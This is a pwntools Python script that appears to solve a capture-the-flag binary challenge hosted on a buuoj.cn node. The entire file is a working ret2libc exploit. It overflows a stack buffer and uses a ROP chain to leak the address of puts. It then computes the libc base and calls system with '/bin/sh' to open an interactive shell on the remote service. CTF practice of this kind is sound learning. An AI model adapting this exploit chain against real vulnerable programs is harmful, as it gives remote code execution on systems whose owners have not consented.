from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27359)
elf = ELF('./pwn')
padding = b'a'*(0x20+0x8)
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400753 # pop rdi; ret
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.recvuntil('Ok.See you!\n')
tmp = io.recvline()[:-1]
puts_addr = u64(tmp.ljust(8, b'\x00'))
log.info('puts_addr => %s = %s' % (repr(tmp), hex(puts_addr)))
ret = 0x40050e # ret
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
payload = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.interactive()